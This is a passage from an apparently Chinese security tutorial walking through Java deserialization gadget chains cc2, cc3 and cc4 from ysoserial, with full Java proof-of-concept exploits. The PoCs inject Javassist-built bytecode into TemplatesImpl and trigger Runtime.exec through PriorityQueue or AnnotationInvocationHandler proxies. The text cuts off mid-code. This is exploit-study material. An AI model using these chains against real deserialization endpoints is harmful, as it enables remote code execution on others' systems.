src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514175531065.png" alt="image-20210514175531065"></p><p>那就没事了。</p><p>现在可以回答这个问题了，因为<strong>会提前触发利用链</strong>，并且value1和value2的分别是两次transform的值，如果类型相同，是会走到这里的。</p><ol start="5"><li>第一个传进去的tmpl在哪里用到了？</li></ol><p>跟一遍，会发现在compare这里传进去了，给了transform：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514180443283.png" alt="image-20210514180443283"></p><ol start="6"><li><p>细心的你会发现，PriorityQueue的queue这个属性是transient的，为什么还能序列化成功？</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514180903833.png" alt="image-20210514180903833"></p></li></ol><p>queue本身作为transient属性，讲道理是不能写入到序列化的二进制文件中的。</p><p>是因为在PriorityQueue的writeObject方法中：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514181212114.png" alt="image-20210514181212114"></p><p>他先拿到流，然后把queue的内容循环的写入到流中，这样就被保存了下来。</p><h4 id="最终版本PoC-3"><a href="#最终版本PoC-3" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImpl_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.开始做InvokerTransformer 命名为iInvokerTransformer，需要借助它内部的invoke方法调用newTransformer方法</span></span><br><span class="line">        <span class="comment">//然后用TransformingComparator包装他，因为TransformingComparator的构造函数可以把iInvokerTransformer传递给自身transformer属性</span></span><br><span class="line">        InvokerTransformer iInvokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator iTransformingComparator = <span class="keyword">new</span> TransformingComparator(iInvokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始</span></span><br><span class="line">        PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queueArray = <span class="keyword">new</span> Object[]&#123;tmpl, <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解封属性comparator, iTransformingComparator =&gt; _comparator</span></span><br><span class="line">        Field _comparator = PriorityQueue.class.getDeclaredField("comparator");</span><br><span class="line">        _comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _comparator.set(pq, iTransformingComparator);</span><br><span class="line">        <span class="comment">//解封属性queue，queueArray =&gt; _queue</span></span><br><span class="line">        Field _queue = PriorityQueue.class.getDeclaredField("queue");</span><br><span class="line">        _queue.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _queue.set(pq, queueArray);</span><br><span class="line">        <span class="comment">//size修改为2</span></span><br><span class="line">        Field _size = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"size"</span>);</span><br><span class="line">        _size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _size.set(pq, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc2_TemplatesImpl.ser"</span>)));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc2_TemplatesImpl.ser"</span>)));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cc3"><a href="#cc3" class="headerlink" title="cc3"></a>cc3</h2><p>条件：</p><ul><li><strong>commons-collections: 3.1～3.2.1</strong></li><li>jdk7u21之前</li></ul><p>cc3更像是cc1和cc2的缝合变体，借助了cc1的lazyMap+动态代理和cc2的newInstance。</p><h3 id="利用链寻找-3"><a href="#利用链寻找-3" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>如果我们先从后半段开始看，和cc2一样，我们的目标是执行TemplatesImpl的newTransformer方法来newInstance</p><p>cc2中我们知道，newTransformer方法属于TemplatesImpl类，更是Templates接口的方法，</p><p>我们需要寻找哪里调用了Templates.newTransformer方法</p><p>搜索一圈发现TrAXFilter这个类比较合适：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515111125775.png" alt="image-20210515111125775"></p><p>跟进去看，发现构造函数依赖Templates接口的参数，会调用参数的newTransformer方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515112530417.png" alt="image-20210515112530417"></p><p>所以现在，<strong>我们需要构造这个参数templates</strong></p><p>或者<strong>new 一个TrAXFilter类的实例</strong>也是可以的啊！ysoserial选择了后者</p><p>怎样可以new一个实例呢？</p><p>ysoserial找到了InstantiateTransformer，看看他的transform方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515104145715.png" alt="image-20210515104145715"></p><p>可以看到，这里面调用了input参数的调用方法，然后借助iParamTypes和iArgs实例化了一个对象出来。</p><p>我们还记得cc1中的Chain可以循环调用transform方法，我们让input是TrAXFilter类对象不就可以了么</p><p>所以这里还是得用到chain</p><p>有了chain，问题来到了哪里会调用chain的入口点呢也就是chain的第一个transform方法？</p><p>记得cc1的LazyMap么？他的get方法会调用transform，如果这里是chain不就美滋滋了么</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515134002101.png" alt="image-20210515134002101"></p><p>哪里可以调用lazyMap的get方法呢？</p><p>或许你还记得cc1的InvocationHandler的invoke会调用get方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515145038750.png" alt="image-20210515145038750"></p><p>稳，现在就是怎么让memberValues参数是LazyMap类型呢？</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515145145356.png" alt="image-20210515145145356"></p><p>降维打击，<strong>动态代理</strong></p><p>我认为这里的思路一定是ysoserial的师傅们看到了AnnotationInvocationHandler既然是InvocationHandler的子类才想到。</p><p>假设现在有一个AnnotationInvocationHandler的类H</p><p>我们都知道，H要是想执行invoke方法，<strong>一定是H作为handler参与了一个动态代理类的实现</strong>。</p><p>我们假设上一句话提到的“一个动态代理类”是p，p调用了任何方法，都会交付给H的invoke去做。</p><p>同时我们还发现AnnotationInvocationHandler的readObject方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515151042914.png" alt="image-20210515151042914"></p><p>他可以对Map类型的属性memberValues执行entrySet方法</p><p>这里其实entrySet或者什么别的其实都不重要，重要的是<strong>发生了调用</strong></p><p>所以这里如果this,memberValues是一个LazyMap的代理类，那么这个代理类的handler的invoke方法就必将会执行。</p><p>所以我们上文提到的p，作为代理类，完全可以代理LazyMap类，handler配置为H就可以了</p><p>那么现在就是确定了我们的payload最外面是AnnotationInvocationHandler类，起名h2，我们要把h2.memberValues配置为一个动态代理，这里可以起名为mapProxy。</p><p>mapProxy目标是为了存放在h2.memberValues里，为了invoke。</p><p>mapProxy的handler位置需要设置为h1，这个h1也是AnnotationInvocationHandler类，h1.memberValues需要设置为LazyMap，为了LazyMap.get。</p><p>所以正常走下来就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h2.readObject() -&gt; h2.memberValues.xxx() -&gt; mapproxy.xxx() -&gt; h1.invoke() -&gt; h1.memberValues.get() -&gt; LazyMap.get()</span><br></pre></td></tr></table></figure><p>成功续命。</p><h3 id="调用链流程梳理"><a href="#调用链流程梳理" class="headerlink" title="调用链流程梳理"></a>调用链流程梳理</h3><p>正常进入AnnotationInvocationHandler的readObject方法，h2的memberValues属性就是mapProxy</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515133241920.png" alt="image-20210515133241920"></p><p>这里由于mapProxy是动态代理，所以只要调用就会调用handler的invoke方法，mapProxy的handler就是h1</p><p>h1也是AnnotationInvocationHandler类，所以会进入本类AnnotationInvocationHandler的invoke方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515133608739.png" alt="image-20210515133608739"></p><p>由于h1的memberValues属性是传进去的lazymap，所以会调用LazyMap的get方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515134002101.png" alt="image-20210515134002101"></p><p>factory是chain，会进入chain的transform，接下里就很熟悉了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515134046605.png" alt="image-20210515134046605"></p><p>成环调用，chain中第一个是元素是<code>new ConstantTransformer(TrAXFilter.class),</code>所以看上面，第一个循环的object返回的就是TrAXFilter的类对象（get(key)参数被无情抛弃），重点是第二次，会进入InstantiateTransformer的transform方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515140301462.png" alt="image-20210515140301462"></p><p>这里面细说，input参数是第一次object对象也就是TrAXFilter.class类对象，iParamTypes属性就是外面构造好的Templates.class类对象，iArgs属性就是提前传进来的tmpl对象。</p><p>con方法是TrAXFilter类中，满足只有一个Templates接口参数的构造函数。</p><p>tmpl是TemplatesImpl类，会调用Templates接口的newInstance方法，参数是iArgs也就是tmpl。</p><p>所以这里会走到TrAXFilter类的构造函数：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515140852568.png" alt="image-20210515140852568"></p><p>导致触发！</p><h3 id="最终版本PoC-4"><a href="#最终版本PoC-4" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><p>PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrAXFilter_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造chain，封装进LazyMap</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                <span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">                        new Class[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;tmpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4. 拿到cons,先做一个h1，h1.memberValues = lazymap</span></span><br><span class="line">        <span class="keyword">final</span> Constructor cons = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler h1 = (InvocationHandler) cons.newInstance(Target<span class="class">.<span class="keyword">class</span>,<span class="title">lazymap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理类实例</span></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),<span class="title">LazyMap</span>.<span class="title">class</span>.<span class="title">getInterfaces</span>(),<span class="title">h1</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例h2，并且把刚刚创建的代理赋值给h2.memberValues</span></span><br><span class="line">        InvocationHandler h2 = (InvocationHandler)cons.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc3_TrAXFilter.ser"</span>)));</span><br><span class="line">        fout.writeObject(h2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc3_TrAXFilter.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cc4"><a href="#cc4" class="headerlink" title="cc4"></a>cc4</h2><p>环境：</p><ul><li><strong>commons-collections4: 4.0</strong></li><li><strong>jdk7u21</strong>之前</li></ul><p>cc4是cc2和cc3的杂交体</p><p>前半段用了cc2的PriorityQueue以及TransformingComparator，TransformingComparator本来应该调用InvokeTransformer的transform方法的，但是因为InvokeTransformer被ban掉了，所以这里ysoserial用了cc3的chain，里面用的是InstantiateTransformer，用了InstantiateTransformer就必须要进行类实例的构造，也就和cc3后面一样了，也用了TrAXFilter来包装TemplatesImpl。</p><h3 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h3><p>cc2里面的前半部分可以一直走到TransformingComparator的transform方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516161059025.png" alt="image-20210516161059025"></p><p>在cc2里面，这里面的<code>this.transformer</code>是InvokerTransformer，但是在cc4里，我们需要换成chain来包装InstantiateTransformer，也就离不开后续TrAXFilter的newInstance了。</p><h3 id="最终版本PoC-5"><a href="#最终版本PoC-5" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造chain,包装成TransformingComparator里，构造成</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                <span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">                        new Class[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;tmpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator iTransComparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始</span></span><br><span class="line">        PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queueArray = <span class="keyword">new</span> Object[]&#123;tmpl, <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解封属性comparator, iTransformingComparator =&gt; 